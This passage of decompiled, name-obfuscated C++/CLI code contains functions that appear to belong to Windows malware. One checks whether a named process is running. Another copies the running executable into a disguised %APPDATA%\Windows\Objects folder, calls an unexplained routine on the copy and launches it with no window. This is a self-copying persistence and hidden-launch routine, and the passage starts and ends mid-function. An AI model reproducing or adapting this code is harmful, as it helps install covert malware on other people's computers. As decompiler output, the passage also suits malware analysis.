    basic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E* CLInKrrTHVE)
  {
    // ISSUE: untyped stack allocation
    int num1 = (int) __untypedstackalloc(\u003CModule\u003E.__CxxQueryExceptionSize());
    try
    {
      tagPROCESSENTRY32W tagProcessentrY32W;
      // ISSUE: cast to a reference type
      // ISSUE: explicit reference operation
      ^(int&) ref tagProcessentrY32W = 556;
      void* toolhelp32Snapshot = \u003CModule\u003E.CreateToolhelp32Snapshot(2U, 0U);
      if ((IntPtr) toolhelp32Snapshot == new IntPtr(-1))
        return false;
      \u003CModule\u003E.Process32FirstW(toolhelp32Snapshot, &tagProcessentrY32W);
      if (\u003CModule\u003E.std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002Ecompare(CLInKrrTHVE, (char*) ((IntPtr) &tagProcessentrY32W + 36)) == 0)
      {
        \u003CModule\u003E.CloseHandle(toolhelp32Snapshot);
        return true;
      }
      while (\u003CModule\u003E.Process32NextW(toolhelp32Snapshot, &tagProcessentrY32W) != 0)
      {
        if (\u003CModule\u003E.std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002Ecompare(CLInKrrTHVE, (char*) ((IntPtr) &tagProcessentrY32W + 36)) == 0)
        {
          \u003CModule\u003E.CloseHandle(toolhelp32Snapshot);
          return true;
        }
      }
      \u003CModule\u003E.CloseHandle(toolhelp32Snapshot);
    }
    catch (Exception ex)
    {
    }
    catch (Exception ex1) when (
    {
      // ISSUE: unable to correctly present filter
      exception* exceptionPtr;
      if (\u003CModule\u003E.__CxxExceptionFilter((void*) Marshal.GetExceptionPointers(), (void*) &\u003CModule\u003E.\u003F\u003F_R0PAVexception\u0040std\u0040\u0040\u00408, 0, (void*) &exceptionPtr) != 0)
      {
        SuccessfulFiltering;
      }
      else
        throw;
    }
    )
    {
      uint num2 = 0;
      \u003CModule\u003E.__CxxRegisterExceptionObject((void*) Marshal.GetExceptionPointers(), (void*) num1);
      try
      {
        try
        {
        }
        catch (Exception ex2) when (
        {
          // ISSUE: unable to correctly present filter
          num2 = (uint) \u003CModule\u003E.__CxxDetectRethrow((void*) Marshal.GetExceptionPointers());
          if (num2 != 0U)
          {
            SuccessfulFiltering;
          }
          else
            throw;
        }
        )
        {
        }
        goto label_18;
        if (num2 != 0U)
          throw;
      }
      finally
      {
        \u003CModule\u003E.__CxxUnregisterExceptionObject((void*) num1, (int) num2);
      }
    }
label_18:
    return false;
  }

  internal static unsafe void NvPARABTz(
    sbyte* name,
    basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E* param)
  {
    basic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E stdAllocatorChar1;
    // ISSUE: fault handler
    try
    {
      \u003CModule\u003E.std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bctor\u007D(&stdAllocatorChar1, 3, 1);
      // ISSUE: fault handler
      try
      {
        \u003CModule\u003E.std\u002Eoperator\u003C\u003C\u003Cstruct\u0020std\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E(\u003CModule\u003E.std\u002Eoperator\u003C\u003C\u003Cstruct\u0020std\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E((basic_ostream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E*) ((IntPtr) &stdAllocatorChar1 + 8), \u003CModule\u003E.getenv((sbyte*) &\u003CModule\u003E.\u003F\u003F_C\u0040_07FMLNDKFM\u0040APPDATA\u003F\u0024AA\u0040)), (sbyte*) &\u003CModule\u003E.\u003F\u003F_C\u0040_0BC\u0040GLBAHDJI\u0040\u003F2Windows\u003F5Objects\u003F2\u003F\u0024AA\u0040);
        char* chPtr = (char*) \u003CModule\u003E.new\u005B\u005D(8192U);
        basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E stdAllocatorChar2;
        basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E* stdAllocatorCharPtr1 = \u003CModule\u003E.std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002Estr(&stdAllocatorChar1, &stdAllocatorChar2);
        // ISSUE: fault handler
        try
        {
          \u003CModule\u003E.MultiByteToWideChar(0U, 0U, \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002Ec_str(stdAllocatorCharPtr1), -1, chPtr, 4096);
        }
        __fault
        {
          // ISSUE: method pointer
          // ISSUE: cast to a function pointer type
          \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorChar2);
        }
        \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorChar2);
        \u003CModule\u003E.CreateDirectoryW(chPtr, (_SECURITY_ATTRIBUTES*) 0);
        basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E stdAllocatorChar3;
        basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E* stdAllocatorCharPtr2 = \u003CModule\u003E.std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002Estr(&stdAllocatorChar1, &stdAllocatorChar3);
        bool flag;
        // ISSUE: fault handler
        try
        {
          uint fileAttributesA = \u003CModule\u003E.GetFileAttributesA(\u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002Ec_str(stdAllocatorCharPtr2));
          flag = fileAttributesA == uint.MaxValue || ((int) fileAttributesA & 16) == 0;
        }
        __fault
        {
          // ISSUE: method pointer
          // ISSUE: cast to a function pointer type
          \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorChar3);
        }
        \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorChar3);
        if (!flag)
          goto label_12;
      }
      __fault
      {
        // ISSUE: method pointer
        // ISSUE: cast to a function pointer type
        \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E__vbaseDtor), (void*) &stdAllocatorChar1);
      }
      \u003CModule\u003E.std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E__vbaseDtor(&stdAllocatorChar1);
    }
    __fault
    {
      // ISSUE: method pointer
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) param);
    }
    \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D(param);
    return;
label_12:
    // ISSUE: fault handler
    try
    {
      // ISSUE: fault handler
      try
      {
        \u003CModule\u003E.std\u002Eoperator\u003C\u003C\u003Cstruct\u0020std\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E((basic_ostream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E*) ((IntPtr) &stdAllocatorChar1 + 8), name);
        allocator\u003Cwchar_t\u003E allocatorWcharT1;
        allocator\u003Cwchar_t\u003E* allocatorWcharTPtr = \u003CModule\u003E.std\u002Eallocator\u003Cwchar_t\u003E\u002E\u007Bctor\u007D(&allocatorWcharT1);
        allocator\u003Cwchar_t\u003E allocatorWcharT2;
        \u003CModule\u003E.std\u002Eallocator\u003Cwchar_t\u003E\u002E\u007Bctor\u007D(&allocatorWcharT2, allocatorWcharTPtr);
        void* voidPtr = \u003CModule\u003E.@new(4U);
        _Aux_cont* auxContPtr1 = (_Aux_cont*) voidPtr;
        vector\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E stdAllocatorWcharT1;
        _Aux_cont* auxContPtr2;
        // ISSUE: fault handler
        try
        {
          if ((IntPtr) voidPtr != IntPtr.Zero)
          {
            *(int*) voidPtr = (int) &stdAllocatorWcharT1;
            auxContPtr2 = (_Aux_cont*) voidPtr;
          }
          else
            auxContPtr2 = (_Aux_cont*) 0;
        }
        __fault
        {
          \u003CModule\u003E.delete((void*) auxContPtr1, voidPtr);
        }
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        ^(int&) ref stdAllocatorWcharT1 = (int) auxContPtr2;
        // ISSUE: fault handler
        try
        {
          \u003CModule\u003E.std\u002Eallocator\u003Cwchar_t\u003E\u002E\u007Bctor\u007D((allocator\u003Cwchar_t\u003E*) ((IntPtr) &stdAllocatorWcharT1 + 8), allocatorWcharTPtr);
        }
        __fault
        {
          // ISSUE: method pointer
          // ISSUE: cast to a function pointer type
          \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002E_Container_base_aux_alloc_real\u003Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorWcharT1);
        }
        // ISSUE: fault handler
        try
        {
          // ISSUE: cast to a reference type
          // ISSUE: explicit reference operation
          ^(int&) ((IntPtr) &stdAllocatorWcharT1 + 12) = 0;
          // ISSUE: cast to a reference type
          // ISSUE: explicit reference operation
          ^(int&) ((IntPtr) &stdAllocatorWcharT1 + 16) = 0;
          // ISSUE: cast to a reference type
          // ISSUE: explicit reference operation
          ^(int&) ((IntPtr) &stdAllocatorWcharT1 + 20) = 0;
        }
        __fault
        {
          // ISSUE: method pointer
          // ISSUE: cast to a function pointer type
          \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002E_Vector_val\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorWcharT1);
        }
        // ISSUE: fault handler
        try
        {
          // ISSUE: cast to a reference type
          // ISSUE: explicit reference operation
          // ISSUE: cast to a reference type
          // ISSUE: explicit reference operation
          int num1 = ^(int&) ((IntPtr) &stdAllocatorWcharT1 + 16) - ^(int&) ((IntPtr) &stdAllocatorWcharT1 + 12) >> 1;
          uint moduleFileNameW;
          do
          {
            uint _Newsize = (uint) (num1 + 260);
            \u003CModule\u003E.std\u002Evector\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002Eresize(&stdAllocatorWcharT1, _Newsize, char.MinValue);
            // ISSUE: cast to a reference type
            // ISSUE: explicit reference operation
            // ISSUE: cast to a reference type
            // ISSUE: explicit reference operation
            uint num2 = (uint) (^(int&) ((IntPtr) &stdAllocatorWcharT1 + 16) - ^(int&) ((IntPtr) &stdAllocatorWcharT1 + 12) >> 1);
            moduleFileNameW = \u003CModule\u003E.GetModuleFileNameW((HINSTANCE__*) 0, \u003CModule\u003E.std\u002Evector\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002Eat(&stdAllocatorWcharT1, 0U), num2);
            // ISSUE: cast to a reference type
            // ISSUE: explicit reference operation
            // ISSUE: cast to a reference type
            // ISSUE: explicit reference operation
            num1 = ^(int&) ((IntPtr) &stdAllocatorWcharT1 + 16) - ^(int&) ((IntPtr) &stdAllocatorWcharT1 + 12) >> 1;
          }
          while (moduleFileNameW >= (uint) num1);
          \u003CModule\u003E.std\u002Evector\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002Eresize(&stdAllocatorWcharT1, moduleFileNameW, char.MinValue);
          // ISSUE: cast to a reference type
          // ISSUE: explicit reference operation
          char* chPtr1 = (char*) ^(int&) ((IntPtr) &stdAllocatorWcharT1 + 16);
          // ISSUE: cast to a reference type
          // ISSUE: explicit reference operation
          // ISSUE: cast to a reference type
          // ISSUE: explicit reference operation
          if ((uint) ^(int&) ((IntPtr) &stdAllocatorWcharT1 + 12) > (uint) ^(int&) ((IntPtr) &stdAllocatorWcharT1 + 16))
            \u003CModule\u003E._invalid_parameter_noinfo();
          _Vector_iterator\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E stdAllocatorWcharT2;
          // ISSUE: cast to a reference type
          // ISSUE: explicit reference operation
          // ISSUE: cast to a reference type
          // ISSUE: explicit reference operation
          ^(int&) ref stdAllocatorWcharT2 = ^(int&) ref stdAllocatorWcharT1;
          // ISSUE: cast to a reference type
          // ISSUE: explicit reference operation
          ^(int&) ((IntPtr) &stdAllocatorWcharT2 + 4) = (int) chPtr1;
          // ISSUE: cast to a reference type
          // ISSUE: explicit reference operation
          char* chPtr2 = (char*) ^(int&) ((IntPtr) &stdAllocatorWcharT1 + 12);
          // ISSUE: cast to a reference type
          // ISSUE: explicit reference operation
          // ISSUE: cast to a reference type
          // ISSUE: explicit reference operation
          if ((uint) ^(int&) ((IntPtr) &stdAllocatorWcharT1 + 12) > (uint) ^(int&) ((IntPtr) &stdAllocatorWcharT1 + 16))
            \u003CModule\u003E._invalid_parameter_noinfo();
          _Vector_iterator\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E stdAllocatorWcharT3;
          // ISSUE: cast to a reference type
          // ISSUE: explicit reference operation
          // ISSUE: cast to a reference type
          // ISSUE: explicit reference operation
          ^(int&) ref stdAllocatorWcharT3 = ^(int&) ref stdAllocatorWcharT1;
          // ISSUE: cast to a reference type
          // ISSUE: explicit reference operation
          ^(int&) ((IntPtr) &stdAllocatorWcharT3 + 4) = (int) chPtr2;
          _Vector_iterator\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E _Last = stdAllocatorWcharT2;
          _Vector_iterator\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E _First = stdAllocatorWcharT3;
          basic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E stdAllocatorWcharT4;
          allocator\u003Cwchar_t\u003E allocatorWcharT3;
          \u003CModule\u003E.std\u002E_String_val\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bctor\u007D((_String_val\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E*) &stdAllocatorWcharT4, \u003CModule\u003E.std\u002Eallocator\u003Cwchar_t\u003E\u002E\u007Bctor\u007D(&allocatorWcharT3));
          \u003CModule\u003E.std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E_Tidy(&stdAllocatorWcharT4, false, 0U);
          forward_iterator_tag __unnamed002;
          \u003CModule\u003E.std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E_Construct\u003Cclass\u0020std\u003A\u003A_Vector_iterator\u003Cwchar_t\u002Cclass\u0020std\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u0020\u003E(&stdAllocatorWcharT4, _First, _Last, __unnamed002);
          // ISSUE: fault handler
          try
          {
            basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E stdAllocatorChar4;
            basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E* stdAllocatorCharPtr3 = \u003CModule\u003E.std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002Estr(&stdAllocatorChar1, &stdAllocatorChar4);
            // ISSUE: fault handler
            try
            {
              \u003CModule\u003E.remove(\u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002Ec_str(stdAllocatorCharPtr3));
            }
            __fault
            {
              // ISSUE: method pointer
              // ISSUE: cast to a function pointer type
              \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorChar4);
            }
            \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorChar4);
            basic_ifstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E stdCharTraitsChar1;
            \u003CModule\u003E.std\u002Ebasic_ifstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002E\u007Bctor\u007D(&stdCharTraitsChar1, \u003CModule\u003E.std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002Ec_str(&stdAllocatorWcharT4), 32, 64, 1);
            // ISSUE: fault handler
            try
            {
              basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E stdAllocatorChar5;
              basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E* stdAllocatorCharPtr4 = \u003CModule\u003E.std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002Estr(&stdAllocatorChar1, &stdAllocatorChar5);
              basic_ofstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E stdCharTraitsChar2;
              // ISSUE: fault handler
              try
              {
                \u003CModule\u003E.std\u002Ebasic_ofstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002E\u007Bctor\u007D(&stdCharTraitsChar2, \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002Ec_str(stdAllocatorCharPtr4), 32, 64, 1);
              }
              __fault
              {
                // ISSUE: method pointer
                // ISSUE: cast to a function pointer type
                \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorChar5);
              }
              // ISSUE: fault handler
              try
              {
                \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorChar5);
                \u003CModule\u003E.std\u002Ebasic_ostream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002E\u003C\u003C((basic_ostream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E*) &stdCharTraitsChar2, (basic_streambuf\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E*) \u003CModule\u003E.std\u002Ebasic_ifstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002Erdbuf(&stdCharTraitsChar1));
                \u003CModule\u003E.zfUNiNlXhZbFq(&stdCharTraitsChar2);
                \u003CModule\u003E.std\u002Ebasic_ofstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002Eclose(&stdCharTraitsChar2);
                \u003CModule\u003E.std\u002Ebasic_ifstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002Eclose(&stdCharTraitsChar1);
                Process process = new Process();
                basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E stdAllocatorChar6;
                basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E* stdAllocatorCharPtr5 = \u003CModule\u003E.std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002Estr(&stdAllocatorChar1, &stdAllocatorChar6);
                // ISSUE: fault handler
                try
                {
                  process.StartInfo.FileName = new string(\u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002Ec_str(stdAllocatorCharPtr5));
                }
                __fault
                {
                  // ISSUE: method pointer
                  // ISSUE: cast to a function pointer type
                  \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorChar6);
                }
                \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorChar6);
                process.StartInfo.Arguments = new string(\u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002Ec_str(param));
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.CreateNoWindow = true;
                process.StartInfo.RedirectStandardOutput = true;
                process.StartInfo.RedirectStandardError = true;
                process.StartInfo.StandardOutputEncoding = Encoding.GetEncoding(850);
                process.Start();
              }
              __fault
              {
                // ISSUE: method pointer
                // ISSUE: cast to a function pointer type
                \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_ofstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002E__vbaseDtor), (void*) &stdCharTraitsChar2);
              }
              \u003CModule\u003E.std\u002Ebasic_ofstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002E__vbaseDtor(&stdCharTraitsChar2);
            }
            __fault
            {
              // ISSUE: method pointer
              // ISSUE: cast to a function pointer type
              \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_ifstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002E__vbaseDtor), (void*) &stdCharTraitsChar1);
            }
            \u003CModule\u003E.std\u002Ebasic_ifstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002E__vbaseDtor(&stdCharTraitsChar1);
          }
          __fault
          {
            // ISSUE: method pointer
            // ISSUE: cast to a function pointer type
            \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorWcharT4);
          }
          \u003CModule\u003E.std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorWcharT4);
        }
        __fault
        {
          // ISSUE: method pointer
          // ISSUE: cast to a function pointer type
          \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Evector\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorWcharT1);
        }
        \u003CModule\u003E.std\u002Evector\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorWcharT1);
      }
      __fault
      {
        // ISSUE: method pointer
        // ISSUE: cast to a function pointer type
        \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E__vbaseDtor), (void*) &stdAllocatorChar1);
      }
      \u003CModule\u003E.std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E__vbaseDtor(&stdAllocatorChar1);
    }
    __fault
    {
      // ISSUE: method pointer
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) param);
    }
    \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D(param);
  }

  [return: MarshalAs(UnmanagedType.U1)]
  internal static unsafe bool nopwSfKdGKgXzz(
    basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E* icm)
  {
    uint num1 = 0;
    // ISSUE: untyped stack allocation
    int num2 = (int) __untypedstackalloc(\u003CModule\u003E.__CxxQueryExceptionSize());
    while (true)
    {
      byte num3 = 0;
      // ISSUE: fault handler
      try
      {
        try
        {
